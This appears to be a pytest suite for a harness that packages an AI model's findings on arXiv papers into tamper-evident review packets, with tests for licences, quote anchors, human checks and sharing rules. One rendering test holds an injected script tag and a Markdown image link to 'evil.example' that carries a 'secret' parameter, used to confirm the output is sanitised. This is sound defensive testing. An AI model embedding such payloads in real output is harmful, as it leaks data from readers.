import argparse
import copy
import json
from datetime import UTC, datetime
from pathlib import Path

import pytest

from review_harness import packet_cli
from review_harness.ledger import Budget, Ledger
from review_harness.packet import (
    OaiRecord,
    PacketError,
    assess,
    build_packet,
    check_text,
    classify_licence,
    json_schema,
    load_packet,
    locate_quote,
    machine_digest,
    mark_finding,
    normalise_orcid,
    parse_arxiv_ref,
    parse_oai_record,
    render_markdown,
    set_sharing,
)
from review_harness.papers import ArxivEntry, PaperText
from review_harness.review import Paper, quote_found, review_harness

from .fakes import MODEL, FakeLLM, finding, scripted

TEXT = (
    "\\section{Results}\n"
    "Summing the three groups, the sample contained $n = 250$ people in total.\n"
    "By Lemma~2 the bound holds for every $k \\geq 1$, which proves the theorem.\n" + "x " * 200
)
PAPER_TEXT = PaperText(arxiv_id="2401.00001", version=1, source="latex", text=TEXT, blinded=True)
ENTRY = ArxivEntry(
    arxiv_id="2401.00001",
    version=1,
    published="2024-01-02",
    updated="2024-01-02",
    title="A paper about bounds",
    abstract="",
    comment="",
    category="math.CO",
    first_author="",
)
CC_BY = "http://creativecommons.org/licenses/by/4.0/"
GOOD_QUOTE = "the sample contained n = 250 people"
GOOD_QUOTE_2 = "the bound holds for every k geq 1"


async def reviewed(tmp_path, findings, verdicts=None):
    llm = FakeLLM(scripted(findings=findings, verdicts=verdicts))
    caller = packet_cli.RecordingCaller(llm, Ledger(tmp_path / "ledger.jsonl"), Budget(100))
    paper = Paper("arxiv:2401.00001v1", ENTRY.title, ENTRY.category, TEXT)
    record = await review_harness(caller, MODEL, paper)
    return record, caller


async def make_raw(tmp_path, findings=None, verdicts=None, licence=CC_BY):
    if findings is None:
        findings = [
            finding("Count does not add up", quote=GOOD_QUOTE),
            finding("Bound needs k >= 2", severity="major", quote=GOOD_QUOTE_2),
        ]
    record, caller = await reviewed(tmp_path, findings, verdicts)
    info = packet_cli.paper_info(
        ENTRY, PAPER_TEXT, OaiRecord(licence, None), datetime(2026, 11, 9).date()
    )
    prefix = f"{MODEL.name}|harness|arxiv:2401.00001v1|"
    method = packet_cli.run_method(
        MODEL,
        "harness",
        record,
        packet_cli.call_records(caller.used, prefix),
        info.first_posted,
        None,
    )
    _, raw = build_packet(
        paper=info,
        method=method,
        findings=packet_cli.packet_findings(record, TEXT),
        created_at="2026-11-09T12:00:00Z",
    )
    return raw


def ready_raw(raw, finding_id="F1"):
    raw = mark_finding(
        raw, finding_id, "checked", "Confirmed: the groups sum to 240.", datetime.now(UTC)
    )
    return set_sharing(raw, name="A. Reader", licence="CC-BY-4.0")


class TestInputs:
    @pytest.mark.parametrize(
        ("ref", "expected"),
        [
            ("2401.01246", ("2401.01246", None)),
            ("2401.01246v2", ("2401.01246", 2)),
            ("arXiv:2401.01246v3", ("2401.01246", 3)),
            ("https://arxiv.org/abs/2401.01246v2", ("2401.01246", 2)),
            ("https://arxiv.org/pdf/2401.01246v1.pdf", ("2401.01246", 1)),
            ("math/0601001v1", ("math/0601001", 1)),
            ("hep-th/9901001", ("hep-th/9901001", None)),
        ],
    )
    def test_arxiv_references(self, ref, expected):
        assert parse_arxiv_ref(ref) == expected

    def test_not_an_arxiv_reference(self):
        with pytest.raises(PacketError):
            parse_arxiv_ref("10.1000/xyz123")

    @pytest.mark.parametrize(
        ("url", "name", "reuse"),
        [
            (CC_BY, "CC BY 4.0", "open"),
            ("http://creativecommons.org/licenses/by-sa/4.0/", "CC BY-SA 4.0", "open"),
            (
                "http://creativecommons.org/licenses/by-nc-sa/4.0/",
                "CC BY-NC-SA 4.0",
                "non_commercial",
            ),
            ("http://creativecommons.org/publicdomain/zero/1.0/", "CC0 1.0", "open"),
            ("http://arxiv.org/licenses/nonexclusive-distrib/1.0/", None, "not_open"),
            (None, None, "not_open"),
            ("https://example.org/some-licence", None, "unknown"),
        ],
    )
    def test_licences(self, url, name, reuse):
        licence = classify_licence(url, "test")
        assert licence.reuse == reuse
        if name:
            assert licence.name == name

    def test_oai_record(self):
        xml = (
            '<OAI-PMH xmlns="http://www.openarchives.org/OAI/2.0/"><GetRecord><record><metadata>'
            '<arXiv xmlns="http://arxiv.org/OAI/arXiv/"><id>2401.00001</id>'
            "<doi>10.1000/journal.1</doi><license>http://creativecommons.org/licenses/by/4.0/</license>"
            "</arXiv></metadata></record></GetRecord></OAI-PMH>"
        )
        assert parse_oai_record(xml) == OaiRecord(CC_BY, "10.1000/journal.1")

    def test_oai_error_has_no_record(self):
        xml = '<OAI-PMH xmlns="http://www.openarchives.org/OAI/2.0/"><error code="idDoesNotExist"/></OAI-PMH>'
        assert parse_oai_record(xml) is None
        assert parse_oai_record("not xml") is None

    def test_orcid(self):
        assert normalise_orcid("0000-0002-1825-0097") == "https://orcid.org/0000-0002-1825-0097"
        assert normalise_orcid("https://orcid.org/0000-0002-1825-0097").endswith("0097")
        with pytest.raises(PacketError, match="check digit"):
            normalise_orcid("0000-0002-1825-0098")
        with pytest.raises(PacketError):
            normalise_orcid("orcid please")


class TestAnchors:
    def test_anchor_is_the_papers_own_text(self):
        anchor = locate_quote(GOOD_QUOTE, TEXT)
        assert anchor is not None
        assert anchor.exact == "the sample contained $n = 250$ people"
        assert TEXT[anchor.start : anchor.end] == anchor.exact
        assert TEXT[: anchor.start].endswith(anchor.prefix)
        assert TEXT[anchor.end :].startswith(anchor.suffix)
        assert len(anchor.prefix) <= 32 and len(anchor.suffix) <= 32

    @pytest.mark.parametrize(
        "quote",
        [
            GOOD_QUOTE,
            GOOD_QUOTE_2,
            "the sample contained 300 people",
            "the",
            "SUMMING THE THREE GROUPS",
        ],
    )
    def test_agrees_with_the_review_quote_check(self, quote):
        assert (locate_quote(quote, TEXT) is not None) == quote_found(quote, TEXT)


class TestPacket:
    async def test_build(self, tmp_path):
        raw = await make_raw(tmp_path)
        packet = load_packet(raw)
        assert raw["id"] == machine_digest(raw) and raw["id"].startswith("sha256:")
        assert [f.id for f in packet.findings] == ["F1", "F2"]
        assert all(f.quote_found and f.anchor for f in packet.findings)
        assert set(packet.human.checks) == {"F1", "F2"}
        assert all(c.status == "unchecked" for c in packet.human.checks.values())
        assert packet.paper.arxiv_doi == "10.48550/arXiv.2401.00001"
        assert packet.paper.licence.reuse == "open"
        assert [c.step for c in packet.method.calls] == ["map", "part1", "verify"]
        assert "language model" in packet.disclosure
        assert "fake-model" in packet.disclosure

    async def test_refuted_findings_are_kept_after_the_rest(self, tmp_path):
        raw = await make_raw(tmp_path, verdicts=["refuted", "upheld"])
        packet = load_packet(raw)
        assert [f.verifier.value for f in packet.findings] == ["upheld", "refuted"]

    async def test_the_id_survives_a_round_trip_through_a_file(self, tmp_path):
        raw = await make_raw(tmp_path)
        path = tmp_path / "p.json"
        packet_cli.write_raw(path, raw)
        again = packet_cli.read_raw(path)
        assert machine_digest(again) == raw["id"]
        assert load_packet(again).model_dump(mode="json") == raw

    async def test_editing_a_finding_breaks_the_id(self, tmp_path):
        raw = await make_raw(tmp_path)
        edited = copy.deepcopy(raw)
        edited["findings"][0]["explanation"] = "Something the model never said."
        _, result = assess(edited)
        assert any("changed after it was written" in e for e in result.errors)

    async def test_human_edits_keep_the_id(self, tmp_path):
        raw = ready_raw(await make_raw(tmp_path))
        raw = set_sharing(raw, orcid="0000-0002-1825-0097")
        _, result = assess(raw)
        assert result.errors == []
        assert machine_digest(raw) == raw["id"]

    async def test_unknown_finding(self, tmp_path):
        raw = await make_raw(tmp_path)
        with pytest.raises(PacketError, match="no finding F9"):
            mark_finding(raw, "F9", "checked", None, datetime.now(UTC))

    async def test_wrong_format_version(self, tmp_path):
        raw = await make_raw(tmp_path)
        raw["format_version"] = 2
        with pytest.raises(PacketError, match="version 2"):
            load_packet(raw)


class TestReadiness:
    async def test_a_new_packet_is_not_ready(self, tmp_path):
        _, result = assess(await make_raw(tmp_path))
        assert not result.ready
        text = " ".join(result.blockers)
        assert "No finding has been checked" in text
        assert "responsibility" in text
        assert "licence" in text

    async def test_checked_named_and_licensed_is_ready(self, tmp_path):
        _, result = assess(ready_raw(await make_raw(tmp_path)))
        assert result.ready, result.blockers
        assert result.shareable == ["F1"]
        assert any("left out of the shared version: F2" in w for w in result.warnings)

    async def test_papers_without_an_open_licence_are_not_shared(self, tmp_path):
        raw = ready_raw(
            await make_raw(tmp_path, licence="http://arxiv.org/licenses/nonexclusive-distrib/1.0/")
        )
        _, result = assess(raw)
        assert not result.ready
        assert any("not an open licence" in b for b in result.blockers)

    async def test_a_checked_finding_must_quote_the_paper(self, tmp_path):
        raw = ready_raw(
            await make_raw(
                tmp_path, findings=[finding("Made up", quote="words nowhere in it at all")]
            )
        )
        _, result = assess(raw)
        assert any("not in the paper's text" in b for b in result.blockers)

    async def test_language_of_wrongdoing_blocks_sharing(self, tmp_path):
        bad = finding("Count does not add up", quote=GOOD_QUOTE)
        bad["explanation"] = "The authors fabricated the total."
        _, result = assess(ready_raw(await make_raw(tmp_path, findings=[bad])))
        assert any("'fabricated'" in b for b in result.blockers)

    async def test_personal_details_in_a_note_block_sharing(self, tmp_path):
        raw = await make_raw(tmp_path)
        raw = mark_finding(
            raw, "F1", "checked", "Ask them at someone@example.org", datetime.now(UTC)
        )
        raw = set_sharing(raw, name="A. Reader", licence="CC0-1.0")
        _, result = assess(raw)
        assert any("email address" in b for b in result.blockers)

    async def test_overruling_the_verifier_needs_a_note(self, tmp_path):
        raw = await make_raw(tmp_path, verdicts=["upheld", "refuted"])
        raw = set_sharing(raw, name="A. Reader", licence="CC-BY-4.0")
        without = mark_finding(raw, "F2", "checked", None, datetime.now(UTC))
        assert any("refuted by the model's own verifier" in b for b in assess(without)[1].blockers)
        with_note = mark_finding(
            raw, "F2", "checked", "The verifier misread Lemma 2.", datetime.now(UTC)
        )
        assert assess(with_note)[1].ready

    async def test_unknown_cutoff_is_disclosed(self, tmp_path):
        _, result = assess(ready_raw(await make_raw(tmp_path)))
        assert any("may have seen it" in w for w in result.warnings)

    async def test_no_findings_is_never_shared(self, tmp_path):
        raw = set_sharing(await make_raw(tmp_path, findings=[]), name="A", licence="CC0-1.0")
        _, result = assess(raw)
        assert not result.ready
        assert any("nothing to share" in b for b in result.blockers)
        assert not any("checked against the paper yet" in b for b in result.blockers)


class TestText:
    async def test_matching_text(self, tmp_path):
        packet = load_packet(await make_raw(tmp_path))
        assert check_text(packet, TEXT) == []

    async def test_different_text(self, tmp_path):
        packet = load_packet(await make_raw(tmp_path))
        errors = check_text(packet, TEXT.replace("250", "240"))
        assert len(errors) == 1 and "differs" in errors[0]

    async def test_moved_anchor(self, tmp_path):
        packet = load_packet(await make_raw(tmp_path))
        packet.findings[0].anchor.start += 1
        assert any("position" in e for e in check_text(packet, TEXT))


class TestRendering:
    async def test_shared_version_has_only_checked_findings(self, tmp_path):
        packet = load_packet(ready_raw(await make_raw(tmp_path)))
        shared = render_markdown(packet, share=True, json_name="p.json")
        assert "Count does not add up" in shared
        assert "Bound needs k >= 2" not in shared
        assert "Checked against the paper by A. Reader" in shared
        assert "Confirmed: the groups sum to 240." in shared
        assert "CC BY 4.0" in shared
        assert "For people and AI assistants reading this" in shared
        assert "1 here" in shared
        assert "p.json" in shared

    async def test_draft_shows_everything(self, tmp_path):
        packet = load_packet(await make_raw(tmp_path, verdicts=["upheld", "refuted"]))
        draft = render_markdown(packet, share=False)
        assert "**Draft.**" in draft
        assert "Not checked yet" in draft
        assert "Refuted by the model's own verifier" in draft

    async def test_model_text_cannot_inject_html_or_load_images(self, tmp_path):
        hostile = finding("<script>alert(1)</script>", quote=GOOD_QUOTE)
        hostile["explanation"] = "See ![x](https://evil.example/leak?d=secret) and <img src=x>."
        packet = load_packet(await make_raw(tmp_path, findings=[hostile]))
        draft = render_markdown(packet, share=False)
        assert "<script>" not in draft and "<img" not in draft
        assert "![x](" not in draft


def test_committed_schema_matches_the_code():
    path = Path(__file__).parents[1] / "docs" / "review-packet.schema.json"
    assert json.loads(path.read_text(encoding="utf-8")) == json_schema(), (
        "Regenerate it: uv run orh packet schema --out docs/review-packet.schema.json"
    )


class FakeArxiv:
    async def query(self, **params):
        return [ENTRY], 1

    async def aclose(self):
        return None


@pytest.fixture
def offline(tmp_path, monkeypatch):
    llm = FakeLLM(scripted(findings=[finding("Count does not add up", quote=GOOD_QUOTE)]))

    async def fetch(arxiv, arxiv_id, version, cache):
        return PAPER_TEXT

    async def oai(arxiv, arxiv_id):
        return OaiRecord(CC_BY, None)

    monkeypatch.setattr(packet_cli, "ArxivClient", FakeArxiv)
    monkeypatch.setattr(packet_cli, "fetch_paper", fetch)
    monkeypatch.setattr(packet_cli, "fetch_oai", oai)
    monkeypatch.setattr(packet_cli, "ProviderLLM", lambda: llm)
    monkeypatch.setattr(packet_cli, "get_model", lambda name: MODEL)
    monkeypatch.setattr(packet_cli, "PACKET_LEDGER", tmp_path / "ledger.jsonl")
    return llm


def review_args(tmp_path):
    return argparse.Namespace(
        paper="arXiv:2401.00001v1",
        model="fake-model",
        arm="harness",
        max_usd=10.0,
        cache=tmp_path / "cache",
        out=tmp_path / "packets",
    )


class TestCommands:
    async def test_review_mark_set_verify_render(self, tmp_path, offline, capsys):
        assert await packet_cli._review(review_args(tmp_path)) == 0
        [path] = (tmp_path / "packets").glob("*.json")
        assert path.with_suffix(".md").exists()
        assert path.name.startswith("2401.00001v1--fake-model--harness--")

        render = argparse.Namespace(file=path, share=True, out=None)
        assert packet_cli.cmd_render(render) == 2  # Nothing checked yet.

        mark = argparse.Namespace(file=path, finding="f1", status="checked", note="Sums to 240.")
        assert packet_cli.cmd_mark(mark) == 0
        details = argparse.Namespace(
            file=path, name="A. Reader", orcid=None, licence="CC-BY-4.0", statement=None
        )
        assert packet_cli.cmd_set(details) == 0

        verify = argparse.Namespace(file=path, cache=tmp_path / "cache", offline=False)
        assert await packet_cli._verify(verify) == 0
        out = capsys.readouterr().out
        assert "every quote is where the packet says" in out
        assert "Ready to share" in out

        assert packet_cli.cmd_render(render) == 0
        shared = path.with_name(f"{path.stem}.shared.md").read_text(encoding="utf-8")
        assert "Sums to 240." in shared

    async def test_replaying_a_review_keeps_the_checks(self, tmp_path, offline):
        assert await packet_cli._review(review_args(tmp_path)) == 0
        [path] = (tmp_path / "packets").glob("*.json")
        packet_cli.cmd_mark(
            argparse.Namespace(file=path, finding="F1", status="checked", note=None)
        )
        calls = len(offline.calls)

        assert await packet_cli._review(review_args(tmp_path)) == 0
        assert len(offline.calls) == calls  # Replayed from the ledger, not asked again.
        [again] = (tmp_path / "packets").glob("*.json")
        assert again == path
        assert packet_cli.read_raw(path)["human"]["checks"]["F1"]["status"] == "checked"

    async def test_verify_reports_a_tampered_packet(self, tmp_path, offline, capsys):
        assert await packet_cli._review(review_args(tmp_path)) == 0
        [path] = (tmp_path / "packets").glob("*.json")
        raw = packet_cli.read_raw(path)
        raw["findings"][0]["title"] = "A stronger claim"
        packet_cli.write_raw(path, raw)
        verify = argparse.Namespace(file=path, cache=tmp_path / "cache", offline=False)
        assert await packet_cli._verify(verify) == 1
        assert "DOES NOT MATCH" in capsys.readouterr().out
